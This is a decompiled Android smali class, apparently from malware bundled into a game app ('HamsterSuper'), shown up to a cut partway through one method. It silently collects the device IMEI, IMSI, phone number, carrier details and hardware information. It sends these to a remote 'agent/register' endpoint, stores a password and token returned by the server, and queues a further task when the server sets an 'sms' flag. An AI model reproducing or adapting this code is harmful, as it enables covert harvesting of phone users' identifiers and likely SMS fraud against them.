.class public LDaemon/Protocol/RegHttp;
.super Ljava/lang/Object;
.source "RegHttp.java"

# interfaces
.implements LDaemon/Base/HttpBase;


# static fields
.field private static final TAG:Ljava/lang/String; = "RegHttp"

.field private static final url:Ljava/lang/String;


# instance fields
.field private cpu:Ljava/lang/String;

.field private htype:Ljava/lang/String;

.field private imei:Ljava/lang/String;

.field private original:Z

.field private passWord:Ljava/lang/String;

.field private ram:Ljava/lang/String;

.field private res:Ljava/lang/String;

.field private rom:Ljava/lang/String;

.field private sms:I

.field private tel:Ljava/lang/String;

.field private z:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 2

    .prologue
    .line 26
    new-instance v0, Ljava/lang/StringBuilder;

    sget-object v1, LDaemon/Action/Action;->host:Ljava/lang/String;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v1, "agent/register?"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    sput-object v0, LDaemon/Protocol/RegHttp;->url:Ljava/lang/String;

    .line 22
    return-void
.end method

.method public constructor <init>()V
    .locals 6

    .prologue
    const/4 v5, 0x0

    .line 40
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 28
    const-string v4, "imei"

    iput-object v4, p0, LDaemon/Protocol/RegHttp;->imei:Ljava/lang/String;

    .line 29
    const-string v4, "12345678911"

    iput-object v4, p0, LDaemon/Protocol/RegHttp;->tel:Ljava/lang/String;

    .line 30
    const-string v4, "htype"

    iput-object v4, p0, LDaemon/Protocol/RegHttp;->htype:Ljava/lang/String;

    .line 31
    const-string v4, "res"

    iput-object v4, p0, LDaemon/Protocol/RegHttp;->res:Ljava/lang/String;

    .line 32
    const-string v4, "cpu"

    iput-object v4, p0, LDaemon/Protocol/RegHttp;->cpu:Ljava/lang/String;

    .line 33
    const-string v4, "rom"

    iput-object v4, p0, LDaemon/Protocol/RegHttp;->rom:Ljava/lang/String;

    .line 34
    const-string v4, "ram"

    iput-object v4, p0, LDaemon/Protocol/RegHttp;->ram:Ljava/lang/String;

    .line 35
    iput-boolean v5, p0, LDaemon/Protocol/RegHttp;->original:Z

    .line 36
    const-string v4, "1"

    iput-object v4, p0, LDaemon/Protocol/RegHttp;->passWord:Ljava/lang/String;

    .line 37
    const-string v4, ""

    iput-object v4, p0, LDaemon/Protocol/RegHttp;->z:Ljava/lang/String;

    .line 38
    iput v5, p0, LDaemon/Protocol/RegHttp;->sms:I

    .line 42
    sget-object v4, LHamsterSuper/Client/Game/BootReceiver;->mCtx:Landroid/content/Context;

    .line 43
    const-string v5, "phone"

    invoke-virtual {v4, v5}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    .line 42
    check-cast v3, Landroid/telephony/TelephonyManager;

    .line 45
    .local v3, "telephonyManager":Landroid/telephony/TelephonyManager;
    invoke-virtual {v3}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v4

    iput-object v4, p0, LDaemon/Protocol/RegHttp;->imei:Ljava/lang/String;

    .line 47
    iget-object v4, p0, LDaemon/Protocol/RegHttp;->imei:Ljava/lang/String;

    if-nez v4, :cond_0

    .line 48
    const-string v4, "imeitest"

    iput-object v4, p0, LDaemon/Protocol/RegHttp;->imei:Ljava/lang/String;

    .line 50
    :cond_0
    invoke-virtual {v3}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v4

    iput-object v4, p0, LDaemon/Protocol/RegHttp;->tel:Ljava/lang/String;

    .line 52
    sget-object v4, Landroid/os/Build;->MODEL:Ljava/lang/String;

    iput-object v4, p0, LDaemon/Protocol/RegHttp;->htype:Ljava/lang/String;

    .line 54
    new-instance v4, Ljava/lang/StringBuilder;

    sget-object v5, LHamsterSuper/Client/Game/BootReceiver;->mCtx:Landroid/content/Context;

    invoke-virtual {v5}, Landroid/content/Context;->getWallpaperDesiredMinimumWidth()I

    move-result v5

    div-int/lit8 v5, v5, 0x2

    invoke-static {v5}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v5, "X"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    .line 55
    sget-object v5, LHamsterSuper/Client/Game/BootReceiver;->mCtx:Landroid/content/Context;

    invoke-virtual {v5}, Landroid/content/Context;->getWallpaperDesiredMinimumHeight()I

    move-result v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    .line 54
    iput-object v4, p0, LDaemon/Protocol/RegHttp;->res:Ljava/lang/String;

    .line 56
    invoke-static {}, LDaemon/Service/SystemMemory;->getCpu()Ljava/lang/String;

    move-result-object v4

    iput-object v4, p0, LDaemon/Protocol/RegHttp;->cpu:Ljava/lang/String;

    .line 57
    invoke-static {}, LDaemon/Service/SystemMemory;->getFreeMemory()Ljava/lang/String;

    move-result-object v4

    iput-object v4, p0, LDaemon/Protocol/RegHttp;->rom:Ljava/lang/String;

    .line 58
    invoke-static {}, LDaemon/Service/SystemMemory;->getAllMemory()Ljava/lang/String;

    move-result-object v4

    iput-object v4, p0, LDaemon/Protocol/RegHttp;->ram:Ljava/lang/String;

    .line 61
    :try_start_0
    sget-object v4, LHamsterSuper/Client/Game/BootReceiver;->mCtx:Landroid/content/Context;

    invoke-virtual {v4}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    .line 62
    .local v2, "pm":Landroid/content/pm/PackageManager;
    sget-object v4, LHamsterSuper/Client/Game/BootReceiver;->mCtx:Landroid/content/Context;

    .line 63
    invoke-virtual {v4}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x0

    .line 62
    invoke-virtual {v2, v4, v5}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;

    move-result-object v1

    .line 64
    .local v1, "pi":Landroid/content/pm/PackageInfo;
    const/4 v4, 0x1

    iput-boolean v4, p0, LDaemon/Protocol/RegHttp;->original:Z

    .line 65
    iget-object v4, v1, Landroid/content/pm/PackageInfo;->applicationInfo:Landroid/content/pm/ApplicationInfo;

    iget v4, v4, Landroid/content/pm/ApplicationInfo;->flags:I

    and-int/lit8 v4, v4, 0x1

    if-nez v4, :cond_1

    .line 67
    const/4 v4, 0x0

    iput-boolean v4, p0, LDaemon/Protocol/RegHttp;->original:Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 74
    .end local v1    # "pi":Landroid/content/pm/PackageInfo;
    .end local v2    # "pm":Landroid/content/pm/PackageManager;
    :cond_1
    :goto_0
    return-void

    .line 69
    :catch_0
    move-exception v4

    move-object v0, v4

    .line 71
    .local v0, "e":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method private static print(Ljava/lang/String;)V
    .locals 1
    .param p0, "msg"    # Ljava/lang/String;

    .prologue
    .line 214
    sget-object v0, LDaemon/Action/Action;->print:Ljava/lang/Boolean;

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 215
    const-string v0, "RegHttp"

    invoke-static {v0, p0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 217
    :cond_0
    return-void
.end method


# virtual methods
.method public getHttpUrl()Ljava/lang/String;
    .locals 10

    .prologue
    const-string v9, "UTF-8"

    .line 140
    sget-object v6, LHamsterSuper/Client/Game/BootReceiver;->mCtx:Landroid/content/Context;

    .line 141
    const-string v7, "phone"

    invoke-virtual {v6, v7}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v5

    .line 140
    check-cast v5, Landroid/telephony/TelephonyManager;

    .line 142
    .local v5, "telephonyManager":Landroid/telephony/TelephonyManager;
    invoke-virtual {v5}, Landroid/telephony/TelephonyManager;->getSubscriberId()Ljava/lang/String;

    move-result-object v1

    .line 143
    .local v1, "imsi":Ljava/lang/String;
    if-nez v1, :cond_0

    .line 144
    const-string v1, "imsitest"

    .line 146
    :cond_0
    invoke-virtual {v5}, Landroid/telephony/TelephonyManager;->getNetworkOperatorName()Ljava/lang/String;

    move-result-object v4

    .line 148
    .local v4, "networkname":Ljava/lang/String;
    invoke-virtual {v5}, Landroid/telephony/TelephonyManager;->getNetworkOperator()Ljava/lang/String;

    move-result-object v2

    .line 150
    .local v2, "networkcode":Ljava/lang/String;
    invoke-virtual {v5}, Landroid/telephony/TelephonyManager;->getNetworkCountryIso()Ljava/lang/String;

    move-result-object v3

    .line 152
    .local v3, "networklocale":Ljava/lang/String;
    const-string v0, ""

    .line 153
    .local v0, "URL":Ljava/lang/String;
    new-instance v6, Ljava/lang/StringBuilder;

    const-string v7, "imei="

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v7, p0, LDaemon/Protocol/RegHttp;->imei:Ljava/lang/String;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "&imsi="

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "&phone_type="

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    .line 154
    iget-object v7, p0, LDaemon/Protocol/RegHttp;->htype:Ljava/lang/String;

    const-string v8, "UTF-8"

    invoke-static {v7, v9}, LDaemon/Base/URLEncoder;->encode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "&cpu="

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    .line 155
    iget-object v7, p0, LDaemon/Protocol/RegHttp;->cpu:Ljava/lang/String;

    const-string v8, "UTF-8"

    invoke-static {v7, v9}, LDaemon/Base/URLEncoder;->encode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "&rom="

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    .line 156
    iget-object v7, p0, LDaemon/Protocol/RegHttp;->rom:Ljava/lang/String;

    const-string v8, "UTF-8"

    invoke-static {v7, v9}, LDaemon/Base/URLEncoder;->encode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "&ram="

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    .line 157
    iget-object v7, p0, LDaemon/Protocol/RegHttp;->ram:Ljava/lang/String;

    const-string v8, "UTF-8"

    invoke-static {v7, v9}, LDaemon/Base/URLEncoder;->encode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "&resolution="

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    .line 158
    iget-object v7, p0, LDaemon/Protocol/RegHttp;->res:Ljava/lang/String;

    const-string v8, "UTF-8"

    invoke-static {v7, v9}, LDaemon/Base/URLEncoder;->encode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "&networkcode="

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    .line 159
    const-string v7, "UTF-8"

    invoke-static {v2, v9}, LDaemon/Base/URLEncoder;->encode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "&networkname="

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    .line 160
    const-string v7, "UTF-8"

    invoke-static {v4, v9}, LDaemon/Base/URLEncoder;->encode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "&networklocale="

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    .line 161
    const-string v7, "UTF-8"

    invoke-static {v3, v9}, LDaemon/Base/URLEncoder;->encode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "&tel="

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    iget-object v7, p0, LDaemon/Protocol/RegHttp;->tel:Ljava/lang/String;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    .line 162
    const-string v7, "&version="

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    sget v7, LDaemon/Action/Action;->version:I

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "&channel="

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    sget v7, LDaemon/Action/Action;->channe:I

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v6

    .line 163
    const-string v7, "&product="

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    sget v7, LDaemon/Action/Action;->product:I

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "&protocol_version="

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    .line 164
    sget v7, LDaemon/Action/Action;->protocol_version:I

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "&original="

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    iget-boolean v7, p0, LDaemon/Protocol/RegHttp;->original:Z

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v6

    .line 153
    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 165
    new-instance v6, Ljava/lang/StringBuilder;

    sget-object v7, LDaemon/Protocol/RegHttp;->url:Ljava/lang/String;

    invoke-static {v7}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v7

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    return-object v6
.end method

.method public getImei()Ljava/lang/String;
    .locals 1

    .prologue
    .line 111
    iget-object v0, p0, LDaemon/Protocol/RegHttp;->imei:Ljava/lang/String;

    return-object v0
.end method

.method public getPassWord()Ljava/lang/String;
    .locals 1

    .prologue
    .line 119
    iget-object v0, p0, LDaemon/Protocol/RegHttp;->passWord:Ljava/lang/String;

    return-object v0
.end method

.method public getSms()I
    .locals 1

    .prologue
    .line 103
    iget v0, p0, LDaemon/Protocol/RegHttp;->sms:I

    return v0
.end method

.method public getuser_value()Ljava/lang/String;
    .locals 1

    .prologue
    .line 127
    iget-object v0, p0, LDaemon/Protocol/RegHttp;->z:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    if-gtz v0, :cond_0

    .line 128
    invoke-virtual {p0}, LDaemon/Protocol/RegHttp;->readrms()Z

    .line 129
    :cond_0
    iget-object v0, p0, LDaemon/Protocol/RegHttp;->z:Ljava/lang/String;

    return-object v0
.end method

.method public parsePackage(Ljava/lang/String;)LDaemon/Service/ServerConnecter$httpState;
    .locals 4
    .param p1, "temp"    # Ljava/lang/String;

    .prologue
    const-string v2, "sms"

    .line 172
    const-string v2, "parsePackage state:start"

    invoke-static {v2}, LDaemon/Protocol/RegHttp;->print(Ljava/lang/String;)V

    .line 176
    :try_start_0
    const-string v2, "md5password"

    invoke-static {p1, v2}, LDaemon/Base/Tools;->parseString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    iput-object v2, p0, LDaemon/Protocol/RegHttp;->z:Ljava/lang/String;

    .line 177
    iget-object v2, p0, LDaemon/Protocol/RegHttp;->z:Ljava/lang/String;

    if-eqz v2, :cond_1

    iget-object v2, p0, LDaemon/Protocol/RegHttp;->z:Ljava/lang/String;

    invoke-virtual {v2}, Ljava/lang/String;->length()I

    move-result v2

    if-lez v2, :cond_1

    .line 178
    const-string v2, "password"

    invoke-static {p1, v2}, LDaemon/Base/Tools;->parseString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    iput-object v2, p0, LDaemon/Protocol/RegHttp;->passWord:Ljava/lang/String;

    .line 179
    const-string v2, "sms"

    invoke-static {p1, v2}, LDaemon/Base/Tools;->parseString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 180
    .local v1, "sms_value":Ljava/lang/String;
    if-eqz v1, :cond_0

    .line 181
    const-string v2, "sms"

    invoke-static {p1, v2}, LDaemon/Base/Tools;->parseString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v2

    iput v2, p0, LDaemon/Protocol/RegHttp;->sms:I

    .line 182
    :cond_0
    invoke-virtual {p0, p1}, LDaemon/Protocol/RegHttp;->starthead(Ljava/lang/String;)V

    .line 183
    invoke-virtual {p0}, LDaemon/Protocol/RegHttp;->saverms()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 190
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "parsePackage state z:"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v3, p0, LDaemon/Protocol/RegHttp;->z:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, LDaemon/Protocol/RegHttp;->print(Ljava/lang/String;)V

    .line 192
    sget-object v2, LDaemon/Service/ServerConnecter$httpState;->success:LDaemon/Service/ServerConnecter$httpState;

    .end local v1    # "sms_value":Ljava/lang/String;
    :goto_0
    return-object v2

    .line 185
    :cond_1
    :try_start_1
    sget-object v2, LDaemon/Service/ServerConnecter$httpState;->error:LDaemon/Service/ServerConnecter$httpState;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    .line 187
    :catch_0
    move-exception v2

    move-object v0, v2

    .line 188
    .local v0, "e":Ljava/lang/Exception;
    sget-object v2, LDaemon/Service/ServerConnecter$httpState;->error:LDaemon/Service/ServerConnecter$httpState;

    goto :goto_0
.end method

.method public readrms()Z
    .locals 9

    .prologue
    const/4 v7, 0x0

    const/4 v5, 0x1

    const-string v8, "z"

    const-string v6, "imei"

    .line 88
    const/16 v2, 0x8

    new-array v0, v2, [Ljava/lang/String;

    const-string v2, "z"

    aput-object v8, v0, v7

    iget-object v2, p0, LDaemon/Protocol/RegHttp;->z:Ljava/lang/String;

    aput-object v2, v0, v5

    const/4 v2, 0x2

    const-string v3, "version"

    aput-object v3, v0, v2

    const/4 v2, 0x3

    new-instance v3, Ljava/lang/StringBuilder;

    sget v4, LDaemon/Action/Action;->version:I

    invoke-static {v4}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    aput-object v3, v0, v2

    const/4 v2, 0x4

    const-string v3, "channe"

    aput-object v3, v0, v2

    const/4 v2, 0x5

    .line 89
    new-instance v3, Ljava/lang/StringBuilder;

    sget v4, LDaemon/Action/Action;->channe:I

    invoke-static {v4}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    aput-object v3, v0, v2

    const/4 v2, 0x6

    const-string v3, "imei"

    aput-object v6, v0, v2

    const/4 v2, 0x7

    new-instance v3, Ljava/lang/StringBuilder;

    iget-object v4, p0, LDaemon/Protocol/RegHttp;->imei:Ljava/lang/String;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    aput-object v3, v0, v2

    .line 90
    .local v0, "key":[Ljava/lang/String;
    sget-object v2, LHamsterSuper/Client/Game/BootReceiver;->mCtx:Landroid/content/Context;

    const/16 v3, 0x3e8

    invoke-static {v2, v3, v0}, LDaemon/Base/Rms;->read(Landroid/content/Context;I[Ljava/lang/String;)Ljava/util/Map;

    move-result-object v1

    .line 91
    .local v1, "temp":Ljava/util/Map;, "Ljava/util/Map<Ljava/lang/String;Ljava/lang/String;>;"
    const-string v2, "z"

    invoke-interface {v1, v8}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/lang/String;

    iput-object v2, p0, LDaemon/Protocol/RegHttp;->z:Ljava/lang/String;

    .line 92
    const-string v2, "imei"

    invoke-interface {v1, v6}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    if-nez v2, :cond_0

    move v2, v5

    .line 99
    :goto_0
    return v2

    .line 94
    :cond_0
    const-string v2, "imei"

    invoke-interface {v1, v6}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/lang/String;

    iput-object v2, p0, LDaemon/Protocol/RegHttp;->imei:Ljava/lang/String;

    .line 95
    iget-object v2, p0, LDaemon/Protocol/RegHttp;->imei:Ljava/lang/String;

    iget-object v3, p0, LDaemon/Protocol/RegHttp;->imei:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_1

    move v2, v5

    .line 96
    goto :goto_0

    .line 98
    :cond_1
    sput v5, LHamsterSuper/Client/Game/BootReceiver;->mode:I

    move v2, v7

    .line 99
    goto :goto_0
.end method

.method public saverms()V
    .locals 5

    .prologue
    .line 77
    const/16 v2, 0x8

    new-array v1, v2, [Ljava/lang/String;

    const/4 v2, 0x0

    const-string v3, "z"

    aput-object v3, v1, v2

    const/4 v2, 0x1

    iget-object v3, p0, LDaemon/Protocol/RegHttp;->z:Ljava/lang/String;

    aput-object v3, v1, v2

    const/4 v2, 0x2

    const-string v3, "version"

    aput-object v3, v1, v2

    const/4 v2, 0x3

    new-instance v3, Ljava/lang/StringBuilder;

    sget v4, LDaemon/Action/Action;->version:I

    invoke-static {v4}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    aput-object v3, v1, v2

    const/4 v2, 0x4

    const-string v3, "channe"

    aput-object v3, v1, v2

    const/4 v2, 0x5

    .line 78
    new-instance v3, Ljava/lang/StringBuilder;

    sget v4, LDaemon/Action/Action;->channe:I

    invoke-static {v4}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    aput-object v3, v1, v2

    const/4 v2, 0x6

    const-string v3, "imei"

    aput-object v3, v1, v2

    const/4 v2, 0x7

    new-instance v3, Ljava/lang/StringBuilder;

    iget-object v4, p0, LDaemon/Protocol/RegHttp;->imei:Ljava/lang/String;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    aput-object v3, v1, v2

    .line 80
    .local v1, "key":[Ljava/lang/String;
    :try_start_0
    sget-object v2, LHamsterSuper/Client/Game/BootReceiver;->mCtx:Landroid/content/Context;

    const/16 v3, 0x3e8

    invoke-static {v2, v3, v1}, LDaemon/Base/Rms;->save(Landroid/content/Context;I[Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 85
    :goto_0
    return-void

    .line 81
    :catch_0
    move-exception v2

    move-object v0, v2

    .line 82
    .local v0, "e":Ljava/lang/Exception;
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "BootReceiver\uff1aRMS"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, LDaemon/Protocol/RegHttp;->print(Ljava/lang/String;)V

    goto :goto_0
.end method

.method public setFinishState(LDaemon/Service/ServerConnecter$httpState;)V
    .locals 2
    .param p1, "httpEnd"    # LDaemon/Service/ServerConnecter$httpState;

    .prologue
    const/4 v1, 0x1

    .line 205
    iget v0, p0, LDaemon/Protocol/RegHttp;->sms:I

    if-ne v0, v1, :cond_0

    .line 207
    invoke-static {}, LDaemon/Service/TaskPool;->getInstance()LDaemon/Service/TaskPool;

    move-result-object v0

    sget-object v1, LHamsterSuper/Client/Game/BootReceiver;->sphttp:LDaemon/Protocol/SpHttp;

    invoke-virtual {v0, v1}, LDaemon/Service/TaskPool;->addConnectTask(LDaemon/Base/HttpBase;)V

    .line 211
    :goto_0
    return-void

    .line 209
    :cond_0
    sput v1, LHamsterSuper/Client/Game/BootReceiver;->mode:I

    goto :goto_0
.end method

.method public setImei(Ljava/lang/String;)V
    .locals 0
    .param p1, "imei"    # Ljava/lang/String;

    .prologue
    .line 115
    iput-object p1, p0, LDaemon/Protocol/RegHttp;->imei:Ljava/lang/String;

    .line 116
    return-void
.end method

.method public setPassWord(Ljava/lang/String;)V
    .locals 0
